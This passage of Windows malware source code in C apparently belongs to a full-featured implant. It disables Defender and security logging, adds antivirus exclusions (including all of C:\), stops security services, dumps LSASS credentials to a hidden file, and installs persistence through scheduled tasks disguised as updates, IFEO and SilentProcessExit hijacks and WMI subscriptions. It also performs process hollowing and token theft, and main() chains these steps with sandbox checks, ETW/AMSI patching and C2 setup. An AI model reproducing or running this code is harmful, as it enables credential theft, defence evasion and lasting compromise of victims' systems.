    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    swprintf(cmd, MAX_PATH + 128, L"powershell -Command \"Add-MpPreference -ExclusionProcess '%s'\"", exePath);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    swprintf(cmd, MAX_PATH + 128, L"powershell -Command \"Add-MpPreference -ExclusionExtension '.exe'\"");
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    swprintf(cmd, MAX_PATH + 128, L"powershell -Command \"Add-MpPreference -ExclusionPath C:\\\"");
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

void DisableSecurityLogs() {
    HKEY hKey;
    DWORD enableMiniNt = 1;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\MiniNt", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExW(hKey, NULL, 0, REG_DWORD, (BYTE*)&enableMiniNt, sizeof(enableMiniNt));
    RegCloseKey(hKey);
    DWORD disableAudit = 1;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExW(hKey, L"auditbaseobjects", 0, REG_DWORD, (BYTE*)&disableAudit, sizeof(disableAudit));
    RegCloseKey(hKey);
}

void DisableSystemRestore() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", L"powershell -Command \"Disable-ComputerRestore -Drive 'C:\\'\"", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD disableSR = 1;
        RegSetValueExW(hKey, L"DisableSR", 0, REG_DWORD, (BYTE*)&disableSR, sizeof(disableSR));
        RegSetValueExW(hKey, L"DisableConfig", 0, REG_DWORD, (BYTE*)&disableSR, sizeof(disableSR));
        RegCloseKey(hKey);
    }
}

void DropTelemetryPackets() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    LPCWSTR domains[] = {
        L"telemetry.microsoft.com", L"vortex-win.data.microsoft.com",
        L"settings-win.data.microsoft.com", L"watson.telemetry.microsoft.com",
        L"vortex.data.microsoft.com", L"vortex-sandbox.data.microsoft.com",
        L"officeclient.microsoft.com", L"oca.telemetry.microsoft.com"
    };
    for (int i = 0; i < 8; i++) {
        WCHAR cmd[512];
        swprintf(cmd, 512, L"cmd.exe /c \"echo 0.0.0.0 %ls >> %%WINDIR%%\\System32\\drivers\\etc\\hosts\"", domains[i]);
        CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 1000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    }
}

void DumpLSASS() {
    DWORD lsassPid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(snapshot, &pe)) {
            do { if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { lsassPid = pe.th32ProcessID; break; } } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    if (lsassPid) {
        EnableDebugPrivilege();
        HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
        if (hLsass) {
            HANDLE hFile = CreateFileW(L"C:\\lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hFile != INVALID_HANDLE_VALUE) { MiniDumpWriteDump(hLsass, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL); CloseHandle(hFile); }
            CloseHandle(hLsass);
        }
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"cmd.exe /c vssadmin create shadow /for=C: > nul", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 10000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    }
}

void StopSecurityServices() {
    const wchar_t* services[] = { L"Sense", L"SgrmBroker", L"WdBoot", L"WdFilter", L"WdNisDrv", L"WinDefend", L"SecurityHealthService", L"wscsvc", L"W3SVC", L"MSExchange", L"MSExchangeDelivery", L"MSExchangeFrontendTransport", L"MSExchangeMailboxReplication", L"MSExchangeSubmission", L"MSExchangeThrottling", L"MicrosoftUpdate", L"BITS", L"wuauserv" };
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    for (int i = 0; i < sizeof(services)/sizeof(services[0]); i++) {
        SC_HANDLE svc = OpenServiceW(scm, services[i], SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (svc) { SERVICE_STATUS status; ControlService(svc, SERVICE_CONTROL_STOP, &status); ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL); CloseServiceHandle(svc); }
    }
    CloseServiceHandle(scm);
}

void AddPersistence() {
    wchar_t cmd[MAX_PATH];
    GetModuleFileNameW(NULL, cmd, MAX_PATH);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    wchar_t taskCmd[1024];
    swprintf(taskCmd, 1024, L"schtasks /create /tn \"WindowsUpdateTask\" /tr \"%s\" /sc onlogon /ru SYSTEM /f", cmd);
    CreateProcessW(L"C:\\Windows\\System32\\schtasks.exe", taskCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    swprintf(taskCmd, 1024, L"schtasks /create /tn \"MicrosoftUpdateTask\" /tr \"%s\" /sc daily /st 09:00 /ru SYSTEM /f", cmd);
    CreateProcessW(L"C:\\Windows\\System32\\schtasks.exe", taskCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        wchar_t debugger[MAX_PATH];
        GetModuleFileNameW(NULL, debugger, MAX_PATH);
        RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (DWORD)(wcslen(debugger) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        wchar_t debugger[MAX_PATH];
        GetModuleFileNameW(NULL, debugger, MAX_PATH);
        RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (DWORD)(wcslen(debugger) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\svchost.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD flags = 0x2;
        RegSetValueExW(hKey, L"MitigationOptions", 0, REG_BINARY, (BYTE*)&flags, sizeof(flags));
        wchar_t monitorPath[MAX_PATH];
        GetModuleFileNameW(NULL, monitorPath, MAX_PATH);
        RegSetValueExW(hKey, L"MonitorProcess", 0, REG_SZ, (BYTE*)monitorPath, (DWORD)(wcslen(monitorPath) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    InstallServicePersistence();
    AddToStartup(cmd);
}

void AddWmiPersistence() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t psCmd[4096];
    swprintf(psCmd, 4096, L"powershell -Command \"$filterArgs=@{Name='StartupFilter';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=\\\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'\\\"}; $filter=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue; $consumerArgs=@{Name='StartupConsumer';CommandLineTemplate='%ls'}; $consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue; $bindingArgs=@{Filter=$filter; Consumer=$consumer}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue; $filterTimerArgs=@{Name='TimerFilter';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=\\\"SELECT * FROM __TimerEvent WHERE TimerID='ChurchTimer'\\\"}; $filterTimer=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $filterTimerArgs -ErrorAction SilentlyContinue; $consumerTimerArgs=@{Name='TimerConsumer';CommandLineTemplate='%ls'}; $consumerTimer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $consumerTimerArgs -ErrorAction SilentlyContinue; $bindingTimerArgs=@{Filter=$filterTimer; Consumer=$consumerTimer}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $bindingTimerArgs -ErrorAction SilentlyContinue\"", exePath, exePath);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 10000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

// ==================== PROCESS HOLLOWING ====================
BOOL ProcessHollowing(LPCWSTR targetProcess, LPCWSTR payloadPath) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(targetProcess, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;
    HANDLE hFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { TerminateProcess(pi.hProcess, 0); return FALSE; }
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* peData = (BYTE*)malloc(fileSize);
    if (!peData) { CloseHandle(hFile); TerminateProcess(pi.hProcess, 0); return FALSE; }
    DWORD bytesRead;
    ReadFile(hFile, peData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    CONTEXT ctx = { CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    NtUnmapViewOfSection(pi.hProcess, (PVOID)ctx.Rdx);
    PVOID imageBase = NULL;
    DWORD_PTR pebAddr = 0;
    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pebAddr, sizeof(pebAddr), NULL);
    if (status == 0) {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
        imageBase = VirtualAllocEx(pi.hProcess, (LPVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!imageBase) {
            imageBase = VirtualAllocEx(pi.hProcess, NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        if (imageBase) {
            WriteProcessMemory(pi.hProcess, imageBase, peData, pNt->OptionalHeader.SizeOfHeaders, NULL);
            for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
                PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((BYTE*)pNt + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER));
                WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)imageBase + pSec->VirtualAddress), peData + pSec->PointerToRawData, pSec->SizeOfRawData, NULL);
            }
        }
    }
    free(peData);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

// ==================== TOKEN STEALING ====================
BOOL TokenStealing() {
    DWORD systemPid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(snapshot, &pe)) {
            do { if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { systemPid = pe.th32ProcessID; break; } } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    if (!systemPid) return FALSE;
    EnableDebugPrivilege();
    HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hLsass) return FALSE;
    HANDLE hToken;
    if (!OpenProcessToken(hLsass, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
        CloseHandle(hLsass);
        return FALSE;
    }
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        CloseHandle(hToken);
        CloseHandle(hLsass);
        return FALSE;
    }
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessWithTokenW(hDupToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hLsass);
    return TRUE;
}

// ==================== MAIN ====================
int main() {
    srand((unsigned int)(GetTickCount64() ^ (ULONGLONG)&main));
    InitObfuscatedStrings();
    InitNtFunctions();
    if (!EnsureSingleInstance()) return 0;
    ParseC2Server();
    if (IsSandboxed()) return 0;
    ElevateSelf();
    PatchEtw();
    PatchAmsi();
    EnableDebugPrivilege();
    if (DisableTamperProtection()) Sleep(3000);
    DisableDefender();
    KillDefenderProcesses();
    DisableUAC();
    DisableAppLockerWDAC();
    AddDefenderExclusions();
    DisableSecurityLogs();
    DisableSystemRestore();
    DropTelemetryPackets();
    ClearEventLogs();
    ScrambleMemory();
    AddPersistence();
    AddWmiPersistence();
    InstallBootkitComponents();
    StopSecurityServices();
    DisableFirewall();
    DumpLSASS();
    EnableKernelExecution();
    RunAsPPL();
    TokenStealing();
    NetworkC2Setup();
    HideFile(L"C:\\lsass.dmp");
    return 0;
}
